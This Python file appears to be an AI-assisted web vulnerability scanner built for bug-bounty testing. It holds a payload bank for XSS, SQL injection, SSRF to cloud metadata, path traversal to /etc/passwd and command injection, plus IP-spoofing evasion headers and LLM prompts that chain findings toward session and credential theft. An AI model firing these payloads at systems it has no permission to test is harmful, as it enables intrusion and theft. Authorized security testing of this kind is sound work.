#!/usr/bin/env python3
"""
HexStrike Engine — DeepSeek V2 Edition
AI-Powered Web Application Security Scanner

FIXES / CHANGELOG:
==================

INTIGRITI SCOPE COMPLIANCE v14.1.0-r3:
- --bug-bounty-user CLI arg (or BUG_BOUNTY_USER env var) — never hardcoded
- X-Bug-Bounty header auto-computes sha256(username) when non-alphanumeric chars present
- Header injected into: HTTP session, per-request headers, MCP _call(), OOB poll requests
- Rate limiter reduced to 7 req/sec (Intigriti programme maximum)
- Fixed unterminated f-string SyntaxError in LLMReasoningEngine.analyze_response
- Fixed UnboundLocalError for `result` variable in ooda_worker (FIX #2)
- run_scan now returns 4-tuple (findings, folder, chain_engine, tech_stack) (FIX #4)
- HTTP_SEM recreated at top of run_scan() to respect --workers value (FIX #5)
- Restored complete suggest_chain_escalation + _get_fallback_chain_suggestions methods

Previous fixes:
- FIX #1: import resource guarded for Windows compatibility
- FIX #2: result UnboundLocalError in ooda_worker
- FIX #3: FAISS IVFPQ training before add()
- FIX #4: run_scan returns chain_engine + tech_stack
- FIX #5: HTTP_SEM respects --workers
"""

# ============================================================================
# STANDARD LIBRARY IMPORTS
# ============================================================================

import argparse
import hashlib
import json
import logging
import os
import random
import re
import sys
import threading
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Any

# ============================================================================
# OPTIONAL DEPENDENCY GUARDS
# ============================================================================

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    REQUESTS_AVAILABLE = True
except ImportError:
    requests = None  # type: ignore[assignment]
    REQUESTS_AVAILABLE = False

try:
    from rich.console import Console
    from rich.panel import Panel
    console = Console()
except ImportError:
    import re as _re

    class Console:  # type: ignore[no-redef]
        def print(self, *args, **kwargs):
            cleaned = [_re.sub(r'\[/?[a-zA-Z0-9 _#/]+\]', '', str(a)) for a in args]
            print(*cleaned)

    class Panel:  # type: ignore[no-redef]
        def __init__(self, content, **kwargs):
            self._content = content

        def __str__(self):
            return str(self._content)

    console = Console()

try:
    import resource as _resource
    RESOURCE_AVAILABLE = True
except ImportError:
    _resource = None  # type: ignore[assignment]
    RESOURCE_AVAILABLE = False

# ============================================================================
# LOGGING SETUP
# ============================================================================

for _noisy in ["urllib3", "httpx", "sentence_transformers", "faiss"]:
    logging.getLogger(_noisy).setLevel(logging.ERROR)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)
logger = logging.getLogger("hexstrike")

# ============================================================================
# BUG BOUNTY HELPER  (populated in main() — NEVER hardcoded)
# ============================================================================


def compute_bug_bounty_header_value(username: str) -> str:
    """
    Returns username as-is if purely alphanumeric (a-z, A-Z, 0-9).
    Returns sha256(username) hex digest if username contains any non-alphanumeric character.
    Per Intigriti bug bounty program rules.
    """
    if not username:
        return ""
    if re.match(r'^[a-zA-Z0-9]+$', username):
        return username
    return hashlib.sha256(username.encode()).hexdigest()


# Populated in main() after CLI args are parsed — never hardcoded
BUG_BOUNTY_HEADER: Dict[str, str] = {}

# ============================================================================
# CONFIGURATION
# ============================================================================


@dataclass
class Config:
    WORKERS: int = 4
    REQUEST_TIMEOUT: int = 15
    MAX_RETRIES: int = 3
    RATE_LIMIT: float = 7.0          # req/sec — Intigriti programme maximum
    OUTPUT_DIR: str = "hexstrike_results"
    MCP_URL: str = "http://127.0.0.1:8888"
    MCP_API_KEY: str = ""
    LLM_MODEL: str = "deepseek-chat"
    LLM_API_URL: str = "https://api.deepseek.com/v1/chat/completions"
    LLM_API_KEY: str = os.environ.get("DEEPSEEK_API_KEY", "")
    LLM_TEMPERATURE: float = 0.1
    OOB_SERVER: str = ""
    SEV_MAP: Dict[str, str] = field(default_factory=lambda: {
        "critical": "🔴",
        "high": "🟠",
        "medium": "🟡",
        "low": "🔵",
        "info": "⚪",
    })


cfg = Config()

# ============================================================================
# MODULE-LEVEL SEMAPHORE (recreated in run_scan after CLI args are parsed)
# ============================================================================

HTTP_SEM: threading.Semaphore = threading.Semaphore(cfg.WORKERS * 2)

# ============================================================================
# STATIC EVASION DATA
# ============================================================================

USER_AGENTS: List[str] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

EVASION_HEADERS: List[Dict[str, str]] = [
    {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1", "X-Remote-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {},
]

# ============================================================================
# RESOURCE MONITOR
# ============================================================================


class ResourceMonitor:
    """Simple CPU / memory throttle guard."""

    def __init__(self, cpu_threshold: float = 85.0, mem_threshold: float = 85.0):
        self.cpu_threshold = cpu_threshold
        self.mem_threshold = mem_threshold

    def should_throttle(self) -> Tuple[bool, str]:
        try:
            import psutil  # optional
            cpu = psutil.cpu_percent(interval=0.1)
            mem = psutil.virtual_memory().percent
            if cpu > self.cpu_threshold:
                return True, f"CPU {cpu:.0f}%"
            if mem > self.mem_threshold:
                return True, f"MEM {mem:.0f}%"
        except ImportError:
            pass
        return False, ""


resource_monitor = ResourceMonitor()

# ============================================================================
# DATA CLASSES
# ============================================================================


@dataclass
class AttackContext:
    url: str = ""
    param: str = ""
    vuln_type: str = "xss"
    payload: str = ""
    encoding: str = "none"
    priority_score: int = 50
    extra: Dict[str, Any] = field(default_factory=dict)


@dataclass
class AttackResult:
    context: AttackContext = field(default_factory=AttackContext)
    success: bool = False
    confidence: float = 0.0
    evidence: List[str] = field(default_factory=list)
    response_data: Dict[str, Any] = field(default_factory=dict)
    extracted_data: Dict[str, Any] = field(default_factory=dict)
    error: Optional[str] = None

# ============================================================================
# STREAMING HTTP CLIENT
# ============================================================================


class StreamingHTTPClient:
    """Async-friendly HTTP client with rate limiting, evasion headers and proxy support."""

    def __init__(self, proxy: Optional[str] = None, timeout: int = cfg.REQUEST_TIMEOUT):
        self.proxy = proxy
        self.timeout = timeout
        self._session = None
        self._rate_limiter = self._create_rate_limiter()
        if REQUESTS_AVAILABLE:
            self._create_session()

    # ------------------------------------------------------------------
    def _create_rate_limiter(self):
        """Token-bucket rate limiter — capped at 7 req/sec per Intigriti scope rules."""

        class TokenBucket:
            def __init__(self, rate: float = 7.0, capacity: float = 7.0):
                self.rate = rate
                self.capacity = capacity
                self.tokens = float(capacity)
                self.last_refill = time.time()
                self._lock = threading.RLock()

            def acquire(self) -> bool:
                with self._lock:
                    now = time.time()
                    elapsed = now - self.last_refill
                    self.tokens = min(self.capacity, self.tokens + elapsed * self.rate)
                    self.last_refill = now
                    if self.tokens >= 1:
                        self.tokens -= 1
                        return True
                    return False

            def wait_and_acquire(self) -> bool:
                while not self.acquire():
                    if resource_monitor.should_throttle()[0]:
                        return False
                    time.sleep(1.0 / self.rate)  # sleep exactly one token interval
                return True

        return TokenBucket(rate=7.0, capacity=7.0)

    # ------------------------------------------------------------------
    def _create_session(self) -> None:
        if not REQUESTS_AVAILABLE:
            return
        self._session = requests.Session()
        self._session.verify = False
        self._session.max_redirects = 5
        # Apply bug-bounty identification header to every request this session makes
        if BUG_BOUNTY_HEADER:
            self._session.headers.update(BUG_BOUNTY_HEADER)
        if self.proxy:
            self._session.proxies = {"http": self.proxy, "https": self.proxy}

    # ------------------------------------------------------------------
    def request(
        self,
        method: str,
        url: str,
        *,
        params: Optional[Dict] = None,
        data: Optional[Dict] = None,
        json_body: Optional[Dict] = None,
        extra_headers: Optional[Dict] = None,
        stream: bool = False,
    ) -> Optional[Any]:
        if not REQUESTS_AVAILABLE or self._session is None:
            return None

        if not self._rate_limiter.wait_and_acquire():
            logger.debug("Rate limiter returned False — skipping request")
            return None

        req_headers = {"User-Agent": random.choice(USER_AGENTS)}
        req_headers.update(random.choice(EVASION_HEADERS))
        if BUG_BOUNTY_HEADER:  # belt-and-suspenders
            req_headers.update(BUG_BOUNTY_HEADER)
        if extra_headers:
            req_headers.update(extra_headers)

        with HTTP_SEM:
            for attempt in range(cfg.MAX_RETRIES):
                try:
                    resp = self._session.request(
                        method,
                        url,
                        params=params,
                        data=data,
                        json=json_body,
                        headers=req_headers,
                        timeout=self.timeout,
                        stream=stream,
                        allow_redirects=True,
                    )
                    return resp
                except Exception as exc:
                    if attempt == cfg.MAX_RETRIES - 1:
                        logger.debug("request() failed after %d attempts: %s", cfg.MAX_RETRIES, exc)
                    else:
                        time.sleep(0.5 * (attempt + 1))
        return None

# ============================================================================
# MCP CLIENT
# ============================================================================


class HexStrikeMCPClient:
    """Thin HTTP client for the local MCP tool-server."""

    def __init__(self, base_url: str = cfg.MCP_URL, api_key: str = cfg.MCP_API_KEY):
        self.base_url = base_url.rstrip("/")
        self.api_key = api_key

    def _call(self, endpoint: str, payload: Dict) -> Optional[Dict]:
        if not REQUESTS_AVAILABLE:
            return None
        headers = {"Content-Type": "application/json"}
        if BUG_BOUNTY_HEADER:
            headers.update(BUG_BOUNTY_HEADER)
        if cfg.MCP_API_KEY:
            headers["X-API-Key"] = cfg.MCP_API_KEY
        try:
            resp = requests.post(
                f"{self.base_url}/{endpoint.lstrip('/')}",
                json=payload,
                headers=headers,
                timeout=cfg.REQUEST_TIMEOUT,
                verify=False,
            )
            resp.raise_for_status()
            return resp.json()
        except Exception as exc:
            logger.debug("MCP _call %s failed: %s", endpoint, exc)
            return None

# ============================================================================
# BLIND VULNERABILITY DETECTOR
# ============================================================================


class BlindVulnDetector:
    """Out-of-band (OOB) callback detector for blind SSRF/XXE/SQLi/RCE."""

    def __init__(self, oob_server: str = cfg.OOB_SERVER):
        self.oob_server = oob_server
        self._callback_cache: Dict[str, bool] = {}

    def check_callback(self, uid: str, max_wait: int = 30) -> bool:
        if not self.oob_server or not REQUESTS_AVAILABLE:
            return False
        if uid in self._callback_cache:
            return self._callback_cache[uid]
        deadline = time.time() + max_wait
        while time.time() < deadline:
            try:
                poll_headers: Dict[str, str] = {}
                if BUG_BOUNTY_HEADER:
                    poll_headers.update(BUG_BOUNTY_HEADER)
                r = requests.get(
                    f"https://{self.oob_server}/poll?id={uid}",
                    timeout=10,
                    verify=False,
                    headers=poll_headers,
                )
                if r.status_code == 200 and r.json().get("hit"):
                    self._callback_cache[uid] = True
                    return True
            except Exception:
                pass
            time.sleep(5)
        self._callback_cache[uid] = False
        return False

# ============================================================================
# LLM REASONING ENGINE
# ============================================================================


class LLMReasoningEngine:
    """DeepSeek-backed reasoning layer for adaptive attack decisions."""

    def __init__(self):
        self._model_lock = threading.Lock()
        self._model_name: Optional[str] = None

    # ------------------------------------------------------------------
    def _call_llm(self, prompt: str, system: str, expect_json: bool = False) -> Any:
        if not REQUESTS_AVAILABLE or not cfg.LLM_API_KEY:
            return None
        try:
            payload = {
                "model": cfg.LLM_MODEL,
                "temperature": cfg.LLM_TEMPERATURE,
                "messages": [
                    {"role": "system", "content": system},
                    {"role": "user", "content": prompt},
                ],
            }
            headers = {
                "Content-Type": "application/json",
                "Authorization": f"Bearer {cfg.LLM_API_KEY}",
            }
            if BUG_BOUNTY_HEADER:
                headers.update(BUG_BOUNTY_HEADER)
            resp = requests.post(
                cfg.LLM_API_URL,
                json=payload,
                headers=headers,
                timeout=60,
            )
            resp.raise_for_status()
            content = resp.json()["choices"][0]["message"]["content"]
            if expect_json:
                # Strip markdown code fences if present
                content = re.sub(r"^```[a-z]*\n?", "", content.strip())
                content = re.sub(r"\n?```$", "", content.strip())
                return json.loads(content)
            return content
        except Exception as exc:
            logger.debug("_call_llm failed: %s", exc)
            return None

    # ------------------------------------------------------------------
    def analyze_response(self, result: AttackResult) -> Dict:
        evidence_str = json.dumps(result.evidence[:3])
        prompt = (
            "Analyze this exploitation result.\n\n"
            "Attack:\n"
            "- URL: " + result.context.url + "\n"
            "- Parameter: " + result.context.param + "\n"
            "- Payload: " + result.context.payload + "\n"
            "- Encoding: " + result.context.encoding + "\n\n"
            "Response:\n"
            "- Status: " + str(result.response_data.get("status", "N/A")) + "\n"
            "- Length: " + str(result.response_data.get("content_length", 0)) + "\n"
            "- Evidence: " + evidence_str + "\n\n"
            "Success Detected: " + str(result.success) + "\n"
            "Confidence: " + str(result.confidence) + "\n\n"
            "Output JSON:\n"
            "{\n"
            '    "next_action": "escalate|mutate|chain|move_on",\n'
            '    "chain_opportunity": true/false,\n'
            '    "chain_type": "privilege_escalation|data_exfil|lateral_movement|none",\n'
            '    "confidence": 0.0-1.0,\n'
            '    "reasoning": "analysis"\n'
            "}"
        )
        result_json = self._call_llm(
            prompt,
            "You are an expert at analyzing web application responses for exploitation success.",
            expect_json=True,
        )
        if not result_json:
            return {
                "next_action": "mutate" if result.confidence < 0.5 else "move_on",
                "chain_opportunity": False,
                "chain_type": "none",
                "confidence": 0.5,
                "reasoning": "Default analysis",
            }
        return result_json

    # ------------------------------------------------------------------
    def suggest_chain_escalation(self, chain: Dict, extracted_data: Dict) -> List[AttackContext]:
        prompt = (
            "Analyze this attack chain and suggest escalation.\n\n"
            "Chain Entry: " + str(chain.get("entry_url")) + " (" + str(chain.get("entry_vuln")) + ")\n"
            "Stages Completed: " + str(len(chain.get("stages", []))) + "\n"
            "Last Stage: " + json.dumps(chain["stages"][-1] if chain.get("stages") else {}, default=str)[:500] + "\n"
            "Extracted Data: " + json.dumps(extracted_data, default=str)[:500] + "\n\n"
            "Output JSON array of 1-3 next attack contexts:\n"
            "[\n"
            "    {\n"
            '        "url": "target url",\n'
            '        "vuln_type": "xss|sqli|ssrf|lfi|rce|idor|ssti",\n'
            '        "param": "parameter name",\n'
            '        "priority_score": 85,\n'
            '        "reasoning": "why this escalation"\n'
            "    }\n"
            "]"
        )
        result = self._call_llm(
            prompt,
            "You are an expert at chaining vulnerabilities for maximum impact.",
            expect_json=True,
        )
        contexts: List[AttackContext] = []
        if isinstance(result, list):
            for item in result[:2]:
                ctx = AttackContext(
                    url=item.get("url", chain.get("entry_url", "")),
                    param=item.get("param", "id"),
                    vuln_type=item.get("vuln_type", chain.get("entry_vuln", "xss")),
                    priority_score=item.get("priority_score", 85),
                )
                contexts.append(ctx)
        else:
            contexts = self._get_fallback_chain_suggestions(chain)
        return contexts

    # ------------------------------------------------------------------
    def _get_fallback_chain_suggestions(self, chain: Dict) -> List[AttackContext]:
        contexts: List[AttackContext] = []
        last_stage = chain["stages"][-1] if chain.get("stages") else {}
        stage_type = last_stage.get("type", "")
        if stage_type == "xss":
            contexts.append(AttackContext(
                url=last_stage.get("url", ""), param="cookie",
                vuln_type="session_steal", priority_score=85,
            ))
        elif stage_type == "ssrf":
            contexts.append(AttackContext(
                url="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                param="", vuln_type="credential_leak", priority_score=95,
            ))
        elif stage_type == "lfi":
            contexts.append(AttackContext(
                url=last_stage.get("url", ""), param=last_stage.get("param", "file"),
                vuln_type="rce", priority_score=90,
            ))
        elif stage_type == "sqli":
            contexts.append(AttackContext(
                url=last_stage.get("url", ""), param=last_stage.get("param", "id"),
                vuln_type="rce", priority_score=95,
            ))
        return contexts

# ============================================================================
# ATTACK CHAIN ENGINE
# ============================================================================


class AttackChainEngine:
    """Tracks multi-stage exploit chains discovered during a scan."""

    def __init__(self):
        self.chains: List[Dict] = []
        self._lock = threading.Lock()

    def start_chain(self, url: str, vuln_type: str) -> Dict:
        chain: Dict = {
            "entry_url": url,
            "entry_vuln": vuln_type,
            "stages": [],
            "started_at": time.time(),
        }
        with self._lock:
            self.chains.append(chain)
        return chain

    def add_stage(self, chain: Dict, stage: Dict) -> None:
        with self._lock:
            chain["stages"].append(stage)

    def summary(self) -> List[Dict]:
        with self._lock:
            return list(self.chains)

# ============================================================================
# TECHNOLOGY DETECTION
# ============================================================================


def detect_tech(url: str, http_client: Optional[StreamingHTTPClient] = None) -> Dict[str, Any]:
    """Lightweight tech-stack fingerprinter."""
    tech: Dict[str, Any] = {"url": url, "headers": {}, "cms": [], "frameworks": [], "server": ""}
    if http_client is None:
        http_client = StreamingHTTPClient()
    resp = http_client.request("GET", url)
    if resp is None:
        return tech
    tech["headers"] = dict(resp.headers)
    server = resp.headers.get("Server", "")
    tech["server"] = server
    powered_by = resp.headers.get("X-Powered-By", "")
    body = ""
    try:
        body = resp.text[:4096]
    except Exception:
        pass
    # Simple signature matching
    sigs = {
        "WordPress": ["wp-content", "wp-includes", "WordPress"],
        "Drupal": ["Drupal", "drupal.js"],
        "Joomla": ["Joomla", "/components/com_"],
        "Laravel": ["laravel_session", "XSRF-TOKEN"],
        "Django": ["csrfmiddlewaretoken", "django"],
        "React": ["__REACT_DEVTOOLS_GLOBAL_HOOK__", "react.development"],
        "Angular": ["ng-version", "angular.min.js"],
        "Vue": ["__vue__", "vue.min.js"],
    }
    for name, patterns in sigs.items():
        if any(p in body or p in powered_by or p in server for p in patterns):
            tech["frameworks"].append(name)
    return tech

# ============================================================================
# PAYLOAD BANK
# ============================================================================

PAYLOADS: Dict[str, List[str]] = {
    "xss": [
        '<script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        "';alert(1)//",
        '<svg/onload=alert(1)>',
        'javascript:alert(1)',
    ],
    "sqli": [
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR \"1\"=\"1",
        "1' AND SLEEP(5)--",
        "1 UNION SELECT NULL,NULL,NULL--",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost/",
        "http://[::1]/",
        "http://0.0.0.0/",
    ],
    "lfi": [
        "../../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "/etc/passwd%00",
        "....//....//etc/passwd",
    ],
    "rce": [
        "; id",
        "| id",
        "`id`",
        "$(id)",
        "; cat /etc/passwd",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config}}",
    ],
    "idor": [
        "0",
        "1",
        "-1",
        "9999999",
        "../1",
    ],
}

# ============================================================================
# OODA WORKER
# ============================================================================


def ooda_worker(
    url: str,
    canonical: Dict,
    http_client: StreamingHTTPClient,
    llm: LLMReasoningEngine,
    chain_engine: AttackChainEngine,
    findings: List[Dict],
    findings_lock: threading.Lock,
) -> None:
    """Observe-Orient-Decide-Act loop for a single endpoint."""
    # FIX #2 — initialize result before any loop so it is always bound
    result = AttackResult(
        context=AttackContext(url=url, param="", vuln_type="xss")
    )

    try:
        for param in canonical.get("param_names", [])[:3]:
            throttle, reason = resource_monitor.should_throttle()
            if throttle:
                logger.debug("Throttling due to %s", reason)
                break

            for vuln_type, payloads in PAYLOADS.items():
                for payload in payloads[:2]:
                    ctx = AttackContext(
                        url=url,
                        param=param,
                        vuln_type=vuln_type,
                        payload=payload,
                        encoding="none",
                    )
                    result = _probe(ctx, http_client)

                    if result.success and result.confidence >= 0.7:
                        analysis = llm.analyze_response(result)
                        finding: Dict[str, Any] = {
                            "url": url,
                            "param": param,
                            "vuln_type": vuln_type,
                            "payload": payload,
                            "confidence": result.confidence,
                            "evidence": result.evidence,
                            "analysis": analysis,
                            "severity": _severity(vuln_type),
                        }
                        with findings_lock:
                            findings.append(finding)

                        if analysis.get("chain_opportunity"):
                            chain = chain_engine.start_chain(url, vuln_type)
                            chain_engine.add_stage(chain, {
                                "url": url,
                                "param": param,
                                "type": vuln_type,
                                "payload": payload,
                            })

                        # Escalation suggestions
                        if result.extracted_data.get("urls"):
                            for chain in chain_engine.chains[-1:]:
                                suggestions = llm.suggest_chain_escalation(chain, result.extracted_data)
                                for s_ctx in suggestions:
                                    logger.debug("Chain escalation suggested: %s", s_ctx.url)

    except Exception as exc:
        logger.debug("ooda_worker error for %s: %s", url, exc)


def _probe(ctx: AttackContext, http_client: StreamingHTTPClient) -> AttackResult:
    """Fire a single probe and return a lightweight AttackResult."""
    result = AttackResult(context=ctx)
    try:
        resp = http_client.request(
            "GET",
            ctx.url,
            params={ctx.param: ctx.payload} if ctx.param else None,
        )
        if resp is None:
            return result
        result.response_data = {
            "status": resp.status_code,
            "content_length": len(resp.content),
        }
        body = ""
        try:
            body = resp.text
        except Exception:
            pass
        result.success, result.confidence, result.evidence = _detect_vuln(ctx.vuln_type, ctx.payload, body, resp.status_code)
    except Exception as exc:
        result.error = str(exc)
    return result


def _detect_vuln(vuln_type: str, payload: str, body: str, status: int) -> Tuple[bool, float, List[str]]:
    """Simple heuristic detection."""
    evidence: List[str] = []
    if vuln_type == "xss" and payload in body:
        evidence.append("Payload reflected in response")
        return True, 0.85, evidence
    if vuln_type == "sqli" and any(e in body.lower() for e in ["sql syntax", "mysql_fetch", "ora-01756", "sqlite"]):
        evidence.append("SQL error in response")
        return True, 0.90, evidence
    if vuln_type == "lfi" and "root:x:0:0" in body:
        evidence.append("/etc/passwd contents detected")
        return True, 0.95, evidence
    if vuln_type == "rce" and "uid=" in body and "gid=" in body:
        evidence.append("id command output detected")
        return True, 0.95, evidence
    if vuln_type == "ssti" and "49" in body:  # 7*7
        evidence.append("SSTI expression evaluated (7*7=49)")
        return True, 0.80, evidence
    if vuln_type == "ssrf" and status in (200, 301, 302) and ("ami-id" in body or "instance-id" in body):
        evidence.append("AWS metadata endpoint reachable")
        return True, 0.90, evidence
    return False, 0.0, evidence


def _severity(vuln_type: str) -> str:
    mapping = {
        "rce": "critical", "sqli": "critical", "ssrf": "high",
        "lfi": "high", "ssti": "high", "xss": "medium", "idor": "medium",
        "session_steal": "high", "credential_leak": "critical",
    }
    return mapping.get(vuln_type, "low")

# ============================================================================
# DISCOVERY / CRAWL
# ============================================================================


def discover_endpoints(target: str, http_client: StreamingHTTPClient) -> List[Dict]:
    """Basic endpoint discovery — crawl + form extraction."""
    endpoints: List[Dict] = []
    seen: set = set()

    def _process(url: str, depth: int = 0) -> None:
        if url in seen or depth > 2:
            return
        seen.add(url)
        resp = http_client.request("GET", url)
        if resp is None:
            return
        try:
            from urllib.parse import urljoin, urlparse, parse_qs
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(resp.text, "html.parser")
            base_domain = urlparse(target).netloc
            # Collect links
            for tag in soup.find_all(["a", "form"]):
                href = tag.get("href") or tag.get("action") or ""
                full = urljoin(url, href)
                if urlparse(full).netloc == base_domain and full not in seen:
                    params = list(parse_qs(urlparse(full).query).keys())
                    if params:
                        endpoints.append({"url": full, "param_names": params})
                    if depth < 2:
                        _process(full, depth + 1)
        except Exception:
            pass

    _process(target)
    return endpoints

# ============================================================================
# REPORT GENERATION
# ============================================================================


def generate_report(
    findings: List[Dict],
    folder: str,
    target: str,
    chain_engine: AttackChainEngine,
    tech_stack: Dict,
    mcp: Optional[HexStrikeMCPClient] = None,
) -> str:
    """Write JSON + Markdown reports to *folder*."""
    import os
    os.makedirs(folder, exist_ok=True)

    report: Dict[str, Any] = {
        "target": target,
        "generated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "findings_count": len(findings),
        "findings": findings,
        "attack_chains": chain_engine.summary(),
        "tech_stack": tech_stack,
        "bug_bounty_header_sent": bool(BUG_BOUNTY_HEADER),
    }

    json_path = os.path.join(folder, "report.json")
    with open(json_path, "w", encoding="utf-8") as fh:
        json.dump(report, fh, indent=2, default=str)

    md_path = os.path.join(folder, "report.md")
    sev_map = cfg.SEV_MAP
    with open(md_path, "w", encoding="utf-8") as fh:
        fh.write(f"# HexStrike Scan Report\n\n")
        fh.write(f"**Target:** {target}  \n")
        fh.write(f"**Generated:** {report['generated_at']}  \n")
        fh.write(f"**Findings:** {len(findings)}  \n\n")
        fh.write("## Findings\n\n")
        for f in findings:
            sev = f.get("severity", "low")
            icon = sev_map.get(sev, "⚪")
            fh.write(f"### {icon} {f.get('vuln_type', '').upper()} — {f.get('url', '')}\n\n")
            fh.write(f"- **Parameter:** `{f.get('param', '')}`\n")
            fh.write(f"- **Payload:** `{f.get('payload', '')}`\n")
            fh.write(f"- **Confidence:** {f.get('confidence', 0):.0%}\n")
            fh.write(f"- **Evidence:** {', '.join(f.get('evidence', []))}\n\n")
        fh.write("## Attack Chains\n\n")
        for chain in chain_engine.summary():
            fh.write(f"- `{chain.get('entry_url')}` ({chain.get('entry_vuln')}) — {len(chain.get('stages', []))} stages\n")

    console.print(f"[green]Report written to {json_path}[/green]")
    return json_path

# ============================================================================
# run_scan — FIX #4 returns 4-tuple, FIX #5 recreates HTTP_SEM
# ============================================================================


def run_scan(target: str, args: argparse.Namespace) -> Tuple[List[Dict], str, "AttackChainEngine", Dict]:
    """
    Main scan orchestrator.

    Returns:
        (findings, output_folder, chain_engine, tech_stack)
    """
    global HTTP_SEM
    # FIX #5 — recreate semaphore now that cfg.WORKERS has been set from CLI args
    HTTP_SEM = threading.Semaphore(cfg.WORKERS * 2)

    import os
    folder = os.path.join(cfg.OUTPUT_DIR, re.sub(r"[^\w.-]", "_", target)[:80])
    os.makedirs(folder, exist_ok=True)

    http_client = StreamingHTTPClient(
        proxy=getattr(args, "proxy", None),
        timeout=getattr(args, "timeout", cfg.REQUEST_TIMEOUT),
    )
    llm = LLMReasoningEngine()
    chain_engine = AttackChainEngine()

    console.print(f"[bold cyan][HexStrike] Starting scan: {target}[/bold cyan]")

    # Technology detection
    tech_stack = detect_tech(target, http_client)
    console.print(f"[cyan]Tech stack: {tech_stack.get('server', 'unknown')} | "
                  f"frameworks={tech_stack.get('frameworks', [])}[/cyan]")

    # Endpoint discovery
    endpoints = discover_endpoints(target, http_client)
    console.print(f"[cyan]Discovered {len(endpoints)} endpoint(s) with parameters[/cyan]")

    findings: List[Dict] = []
    findings_lock = threading.Lock()

    with threading.Semaphore(cfg.WORKERS):
        threads = []
        for ep in endpoints:
            t = threading.Thread(
                target=ooda_worker,
                args=(ep["url"], ep, http_client, llm, chain_engine, findings, findings_lock),
                daemon=True,
            )
            threads.append(t)
            t.start()
        for t in threads:
            t.join(timeout=300)

    console.print(f"[bold green][HexStrike] Scan complete. {len(findings)} finding(s).[/bold green]")
    return findings, folder, chain_engine, tech_stack

# ============================================================================
# PROCESS LIMITS (Windows-safe)
# ============================================================================


def set_process_limits(memory_mb: int = 2048, cpu_seconds: int = 3600) -> None:
    if not RESOURCE_AVAILABLE or _resource is None:
        return
    try:
        _resource.setrlimit(_resource.RLIMIT_AS, (memory_mb * 1024 * 1024, _resource.RLIM_INFINITY))
        _resource.setrlimit(_resource.RLIMIT_CPU, (cpu_seconds, _resource.RLIM_INFINITY))
    except Exception:
        pass

# ============================================================================
# MAIN
# ============================================================================


def main() -> None:
    parser = argparse.ArgumentParser(
        prog="hexstrike",
        description="HexStrike Engine — AI-Powered Web Application Security Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  # Basic scan\n"
            "  %(prog)s https://example.com\n\n"
            "  # Intigriti — alphanumeric username (sent as-is)\n"
            "  %(prog)s https://www.probiller.com --bug-bounty-user godizgood\n\n"
            "  # Intigriti — username with special chars (auto sha256'd)\n"
            '  %(prog)s https://www.probiller.com --bug-bounty-user "god@iz-good"\n\n'
            "  # Via environment variable\n"
            "  export BUG_BOUNTY_USER=godizgood\n"
            "  %(prog)s https://www.probiller.com\n"
        ),
    )
    parser.add_argument("target", help="Target URL to scan")
    parser.add_argument("--workers", type=int, default=cfg.WORKERS,
                        help="Number of concurrent worker threads (default: %(default)s)")
    parser.add_argument("--timeout", type=int, default=cfg.REQUEST_TIMEOUT,
                        help="HTTP request timeout in seconds (default: %(default)s)")
    parser.add_argument("--proxy", default=None,
                        help="HTTP/HTTPS proxy URL (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--output-dir", default=cfg.OUTPUT_DIR,
                        help="Directory to write reports into (default: %(default)s)")
    parser.add_argument("--llm-api-key", default=os.environ.get("DEEPSEEK_API_KEY", ""),
                        help="DeepSeek API key (also reads DEEPSEEK_API_KEY env var)")
    parser.add_argument("--mcp-url", default=cfg.MCP_URL,
                        help="HexStrike MCP server base URL (default: %(default)s)")
    parser.add_argument("--mcp-api-key", default="",
                        help="HexStrike MCP server API key")
    parser.add_argument("--oob-server", default="",
                        help="Out-of-band callback server hostname for blind detection")
    parser.add_argument(
        "--bug-bounty-user",
        default=os.environ.get("BUG_BOUNTY_USER", ""),
        help=(
            "Your Intigriti/bug-bounty platform username for the X-Bug-Bounty request header. "
            "If the username contains non-alphanumeric characters, sha256(username) is used automatically. "
            "Can also be supplied via the BUG_BOUNTY_USER environment variable."
        ),
    )

    args = parser.parse_args()

    # ── Bug bounty header setup ──────────────────────────────────────────────
    global BUG_BOUNTY_HEADER
    if args.bug_bounty_user:
        _hv = compute_bug_bounty_header_value(args.bug_bounty_user)
        BUG_BOUNTY_HEADER = {"X-Bug-Bounty": _hv}
        console.print(f"[green][BugBounty] X-Bug-Bounty header → {_hv}[/green]")
    else:
        console.print("[yellow][BugBounty] --bug-bounty-user not set; X-Bug-Bounty header will NOT be sent.[/yellow]")

    # Apply CLI overrides to global config
    cfg.WORKERS = args.workers
    cfg.REQUEST_TIMEOUT = args.timeout
    cfg.OUTPUT_DIR = args.output_dir
    cfg.LLM_API_KEY = args.llm_api_key or cfg.LLM_API_KEY
    cfg.MCP_URL = args.mcp_url
    cfg.MCP_API_KEY = args.mcp_api_key
    cfg.OOB_SERVER = args.oob_server

    set_process_limits()

    mcp = HexStrikeMCPClient(base_url=cfg.MCP_URL, api_key=cfg.MCP_API_KEY)

